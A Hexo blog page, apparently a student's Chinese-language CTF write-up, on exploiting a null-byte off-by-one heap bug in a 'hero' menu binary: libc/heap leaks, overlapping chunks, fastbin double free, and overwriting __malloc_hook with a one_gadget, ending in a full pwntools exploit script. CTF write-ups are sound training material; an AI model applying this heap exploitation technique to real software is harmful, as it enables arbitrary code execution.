@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<title>
+  
+    一次Null-by-one的利用过程
+  
+</title>
+
+<meta name="description" content="学校比赛的压轴题。">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一次Null-by-one的利用过程">
+<meta property="og:url" content="http://yoursite.com/2018/07/29/一次Null-by-one的利用过程/index.html">
+<meta property="og:site_name" content="pwndog&#39;s blog">
+<meta property="og:description" content="学校比赛的压轴题。">
+<meta property="og:locale" content="CN">
+<meta property="og:image" content="http://yoursite.com/2018/07/29/一次Null-by-one的利用过程/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/29/一次Null-by-one的利用过程/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/29/一次Null-by-one的利用过程/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/29/一次Null-by-one的利用过程/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/29/一次Null-by-one的利用过程/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/29/一次Null-by-one的利用过程/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/29/一次Null-by-one的利用过程/7.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/29/一次Null-by-one的利用过程/9.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/29/一次Null-by-one的利用过程/8.png">
+<meta property="og:updated_time" content="2018-07-29T07:58:40.657Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一次Null-by-one的利用过程">
+<meta name="twitter:description" content="学校比赛的压轴题。">
+<meta name="twitter:image" content="http://yoursite.com/2018/07/29/一次Null-by-one的利用过程/1.png">
+
+
+  <link rel="alternative" href="/atom.xml" title="pwndog&#39;s blog" type="application/atom+xml">
+
+
+
+  <link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="/perfect-scrollbar/css/perfect-scrollbar.min.css">
+<link rel="stylesheet" href="/styles/main.css">
+
+
+
+
+
+
+</head>
+<body
+  
+    class="monochrome"
+  
+  >
+  <div class="mobile-header">
+  <button class="sidebar-toggle" type="button">
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+  </button>
+  <a class="title" href="/">pwndog&#39;s blog</a>
+</div>
+
+  <div class="main-container">
+    <div class="sidebar">
+  <div class="header">
+    <h1 class="title"><a href="/">pwndog&#39;s blog</a></h1>
+    
+    <div class="info">
+      <div class="content">
+        
+        
+          <div class="author">zzm</div>
+        
+      </div>
+      
+        <div class="avatar">
+          
+            <a href="/about"><img src="https://cn.gravatar.com/avatar/35fef74d731255cd569c2c2b0b9e87e4?s=200"></a>
+          
+        </div>
+      
+    </div>
+  </div>
+  <div class="body">
+    
+      
+        <ul class="nav">
+          
+            
+              <li class="category-list-container">
+                <a href="javascript:;">Category</a>
+                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/glibc源码阅读/">glibc源码阅读</a><span class="category-list-count">1</span></li></ul>
+              </li>
+            
+          
+            
+              <li class="tag-list-container">
+                <a href="javascript:;">Tag</a>
+                <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GLIBC/">GLIBC</a><span class="tag-list-count">1</span></li></ul>
+              </li>
+            
+          
+            
+              <li class="archive-list-container">
+                <a href="javascript:;">Archive</a>
+                <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">5</span></li></ul>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="/" title="Homepage">Homepage</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/archives" title="By Year">By Year</a>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="https://github.com/denjones/hexo-theme-chan" title="Chan" target="_blank" rel="noopener">Chan</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="https://github.com/denjones" title="Github" target="_blank" rel="noopener">Github</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/atom.xml" title="RSS">RSS</a>
+              </li>
+            
+          
+        </ul>
+      
+    
+  </div>
+</div>
+
+    <div class="main-content">
+      
+        <div style="max-width: 1000px">
+      
+          <article id="post-一次Null-by-one的利用过程" class="article article-type-post">
+  
+    <h1 class="article-header">
+      一次Null-by-one的利用过程
+    </h1>
+  
+  
+
+  <div class="article-info">
+    <span class="article-date">
+  2018-07-29
+</span>
+
+    
+
+    
+	<span class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+	</span>
+
+
+  </div>
+  <div class="article-entry">
+    <p>学校比赛的压轴题。<br><a id="more"></a></p>
+<h3 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h3><p><img src="/2018/07/29/一次Null-by-one的利用过程/1.png" alt="CHECKSEC"></p>
+<h3 id="0x01-流程分析"><a href="#0x01-流程分析" class="headerlink" title="0x01 流程分析"></a>0x01 流程分析</h3><p>将程序拖入IDA分析<br><img src="/2018/07/29/一次Null-by-one的利用过程/2.png" alt="CHECKSEC"><br>常规菜单</p>
+<h4 id="1-添加功能"><a href="#1-添加功能" class="headerlink" title="1.添加功能"></a>1.添加功能</h4><p><img src="/2018/07/29/一次Null-by-one的利用过程/3.png" alt="CHECKSEC"><br>先malloc一个fastbin一个smallbin，大小固定位0x68和0xf8。一个保存hero的name，一个保存hero的power。函数存在明显的 nullbyte off-by-one漏洞。会覆盖下面堆的大小。</p>
+<h4 id="2-show功能"><a href="#2-show功能" class="headerlink" title="2 show功能"></a>2 show功能</h4><p>.<img src="/2018/07/29/一次Null-by-one的利用过程/4.png" alt="CHECKSEC"><br>将两个堆的内容输出，可用来泄露地址。</p>
+<h4 id="3-修改功能"><a href="#3-修改功能" class="headerlink" title="3.修改功能"></a>3.修改功能</h4><p><img src="/2018/07/29/一次Null-by-one的利用过程/5.png" alt="CHECKSEC"><br>这个修改功能很坑，先free原来的堆，再malloc回来写入。<br>依然存在 nullbyte off-by-one漏洞。</p>
+<h4 id="4-删除功能"><a href="#4-删除功能" class="headerlink" title="4 删除功能"></a>4 删除功能</h4><p>.<img src="/2018/07/29/一次Null-by-one的利用过程/6.png" alt="CHECKSEC"><br>先free再将指针清零，无漏洞点。</p>
+<h3 id="0x02-攻击分析"><a href="#0x02-攻击分析" class="headerlink" title="0x02 攻击分析"></a>0x02 攻击分析</h3><h4 id="1-信息泄露"><a href="#1-信息泄露" class="headerlink" title="1.信息泄露"></a>1.信息泄露</h4><p>通过常规堆地址泄露，分配两个small chunk防止与top chunk合并，free后，程序会泄露出main_arena地址，可以得到libc的基地址。<br>还可以泄露出堆的地址。由于fastbin chunk最后一位会补0，不能通过show函数泄露地址。<br>所以通过分配三个small chunk，free前两个，第一个chunk的fd会指向main_arena,bk会指向free掉的第二个chunk的地址。<br>通过show功能得到堆的地址及libc地址<br><img src="/2018/07/29/一次Null-by-one的利用过程/7.png" alt="CHECKSEC"></p>
+<h4 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h4><p>基础知识：<br><img src="/2018/07/29/一次Null-by-one的利用过程/9.png" alt="CHECKSEC"><br>chunk 结构<br>添加功能和修改功能存在off by one漏洞，会将small bin size0x101覆盖位0x100.<br>可以从两方面进行尝试<br>a.使用unlink<br>首先程序开启了PIE，不能得到保存堆地址的数组。其次，程序edit功能要先free再malloc。 如果覆盖ptr为&amp;ptr-0x18,free会引起异常程序退出，所以unlink不可行。<br>b.使用堆块重叠进行fastbin利用<br>我们最终要实现这种情况。free a,free b,free a.<br>fastbin的空闲chunk通过单链表fd指针连接。<br>这时连接情况为a-&gt;b-&gt;a-&gt;0<br>之后进行四次malloc。<br>第一次malloc得到a<br>并修改a-&gt;malloc_hook(申请的堆大小为0x71，在malloc_hook-0x23处的0x7f可以用来利用)<br>第二次malloc得到b<br>第三次malloc得到a<br>第四次malloc得到malloc_hook-0x13地址可以通过one_gadget得到的地址覆盖malloc_hook，之后执行malloc函数就实现成功。</p>
+<p>此时需要构造重叠堆块来实现。<br>此处用到off by one漏洞。<br>覆盖small chunk大小为0x100，表示前一个chunk处于空闲状态。free此small chunk，会产生一次堆的合并。<br>合并过程为，small chunk地址-pre_size处的chunk与small chunk进行合并。<br>由于我们知道堆的地址，可以进行伪造堆块的操作。存在限制（伪造堆块-&gt;fd-&gt;bk指向伪造堆块，伪造堆块-&gt;bk-&gt;fd指向伪造堆块 ）。<br> presize  0x101块a<br> fd       bk</p>
+<pre><code>0x70块 b 
+</code></pre><p>presize为a+b 0x100 块c<br>此时free块c，再malloc一个small chunk一个fast chunk就可以得到分配到已经分配出来的块b。<br>这里可以利用edit功能里的free再malloc实现。<br>此时保存堆地址数组里就会有两个相同的块b，可以实现刚才的情况<br>此时还要注意free功能是同时free small chunk和fast chunk要注意控制small chunk不会产生double free<br><img src="/2018/07/29/一次Null-by-one的利用过程/8.png" alt="CHECKSEC"><br>保存fast chunk地址出现了相同的地址，可以通过free功能实现fastbin attack<br>。<br>0x03 利用脚本<br>脚本有点粗糙 大神勿喷。。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./hero'</span>)</span><br><span class="line">e=ELF(<span class="string">'libc-2.24.so'</span>)</span><br><span class="line">context(log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    p.writeline(<span class="string">'1'</span>)</span><br><span class="line">    p.readuntil(<span class="string">'name:'</span>)</span><br><span class="line">    p.write(a)</span><br><span class="line">    p.readuntil(<span class="string">'power:'</span>)</span><br><span class="line">    p.write(b)</span><br><span class="line">    p.readuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">de</span><span class="params">(a)</span>:</span></span><br><span class="line">    p.writeline(<span class="string">'4'</span>)</span><br><span class="line">    p.readuntil(<span class="string">'What hero do you want to remove?'</span>)</span><br><span class="line">    p.writeline(str(a))</span><br><span class="line">    p.readuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">edi</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line">    p.writeline(<span class="string">'3'</span>)</span><br><span class="line">    p.readuntil(<span class="string">'What hero do you want to edit?'</span>)</span><br><span class="line">    p.writeline(str(c))</span><br><span class="line">    p.readuntil(<span class="string">'name:'</span>)</span><br><span class="line">    p.write(a)</span><br><span class="line">    p.readuntil(<span class="string">'power:'</span>)</span><br><span class="line">    p.write(b)</span><br><span class="line">    p.readuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">ad(<span class="string">'a'</span>,<span class="string">'b'</span>)</span><br><span class="line">ad(<span class="string">'a'</span>,<span class="string">'b'</span>)</span><br><span class="line">ad(<span class="string">'a'</span>,<span class="string">'b'</span>)</span><br><span class="line">de(<span class="number">0</span>)</span><br><span class="line">de(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">ad(<span class="string">'a'</span>,<span class="string">'11111111'</span>)</span><br><span class="line">p.writeline(<span class="string">'2'</span>)</span><br><span class="line">p.readuntil(<span class="string">'show?'</span>)</span><br><span class="line">p.writeline(<span class="string">'0'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Power:11111111'</span>)</span><br><span class="line">heap_base=(u64(p.read(<span class="number">6</span>)+chr(<span class="number">0</span>)*<span class="number">2</span>))<span class="number">-0x1e0</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line">ad(<span class="string">'a'</span>,<span class="string">'11111111'</span>)</span><br><span class="line">p.writeline(<span class="string">'2'</span>)</span><br><span class="line">p.readuntil(<span class="string">'show?'</span>)</span><br><span class="line">p.writeline(<span class="string">'1'</span>)</span><br><span class="line">p.readuntil(<span class="string">'Power:11111111'</span>)</span><br><span class="line">lib_base=(u64(p.read(<span class="number">6</span>)+chr(<span class="number">0</span>)*<span class="number">2</span>))<span class="number">-0x398b58</span></span><br><span class="line">onegad=lib_base+<span class="number">0xb8ac8</span></span><br><span class="line"><span class="keyword">print</span> hex(lib_base)</span><br><span class="line">de(<span class="number">0</span>)</span><br><span class="line">de(<span class="number">1</span>)</span><br><span class="line">ad(<span class="string">'a'</span>,p64(heap_base+<span class="number">0x1e0</span>)+p64(heap_base+<span class="number">0x1e0</span>))</span><br><span class="line">ad(<span class="string">'a'</span>,p64(heap_base+<span class="number">0x70</span>)+p64(heap_base+<span class="number">0x70</span>))</span><br><span class="line">ad(<span class="string">'a'</span>,<span class="string">'123'</span>)</span><br><span class="line">ad(<span class="string">'a'</span>,<span class="string">'123'</span>)</span><br><span class="line">zz=raw_input()</span><br><span class="line">edi(<span class="string">'a'</span>*<span class="number">0x60</span>+p64(<span class="number">0x2e0</span>),<span class="string">'123'</span>,<span class="number">2</span>)</span><br><span class="line">ad(<span class="string">'aaaaaaaaaa'</span>,<span class="string">'baaaaaaaa'</span>)</span><br><span class="line">ad(<span class="string">'a'</span>,<span class="string">'123'</span>)</span><br><span class="line">de(<span class="number">2</span>)</span><br><span class="line">de(<span class="number">3</span>)</span><br><span class="line">de(<span class="number">6</span>)</span><br><span class="line">malloc_hook=lib_base+e.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span></span><br><span class="line">ad(p64(malloc_hook),<span class="string">'123'</span>)</span><br><span class="line">ad(<span class="string">'a'</span>,<span class="string">'123'</span>)</span><br><span class="line">ad(<span class="string">'a'</span>,<span class="string">'123'</span>)</span><br><span class="line">ad(<span class="string">'a'</span>*<span class="number">0x13</span>+p64(onegad),p64(malloc_hook))</span><br><span class="line">p.writeline(<span class="string">'1'</span>)</span><br><span class="line">p.writeline(<span class="string">'1'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+
+  </div>
+  <footer class="article-footer">
+    
+  <div class="cc">
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.C" target="_blank" title="Attribution-ShareAlike">
+      <img src="/images/cc/cc.png">
+      
+          <img src="/images/cc/by.png">
+        
+          <img src="/images/cc/sa.png">
+      
+      <span>
+        This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.
+      </span>
+    </a>
+  </div>
+
+
+    
+
+  </footer>
+</article>
+
+
+
+
+
+
+
+          <div class="main-footer">
+  
+    © 2018 pwndog&#39;s blog - Powered by <a href="http://hexo.io" target="_blank">Hexo</a> - Theme <a href="https://github.com/denjones/hexo-theme-chan" target="_blank">Chan</a>
+  
+</div>
+
+      
+        </div>
+      
+    </div>
+  </div>
+  <script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+
+  <link rel="stylesheet" href="/PhotoSwipe/photoswipe.css">
+  <link rel="stylesheet" href="/PhotoSwipe/default-skin/default-skin.css">
+
+  <!-- Root element of PhotoSwipe. Must have class pswp. -->
+  <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+             It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+      <!-- Container that holds slides.
+                PhotoSwipe keeps only 3 of them in the DOM to save memory.
+                Don't modify these 3 pswp__item elements, data is added later on. -->
+      <div class="pswp__container">
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+      </div>
+
+      <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+      <div class="pswp__ui pswp__ui--hidden">
+
+        <div class="pswp__top-bar">
+
+          <!--  Controls are self-explanatory. Order can be changed. -->
+
+          <div class="pswp__counter"></div>
+
+          <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+          <button class="pswp__button pswp__button--share" title="Share"></button>
+
+          <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+          <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+          <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+          <!-- element will get class pswp__preloader--active when preloader is running -->
+          <div class="pswp__preloader">
+            <div class="pswp__preloader__icn">
+              <div class="pswp__preloader__cut">
+                <div class="pswp__preloader__donut"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+          <div class="pswp__share-tooltip"></div>
+        </div>
+
+        <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+
+        <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+
+        <div class="pswp__caption">
+          <div class="pswp__caption__center"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/PhotoSwipe/photoswipe.js"></script>
+  <script src="/PhotoSwipe/photoswipe-ui-default.js"></script>
+
+
+<script src="/perfect-scrollbar/js/min/perfect-scrollbar.min.js"></script>
+<script src="/scripts/main.js"></script>
+
+</body>
+</html>
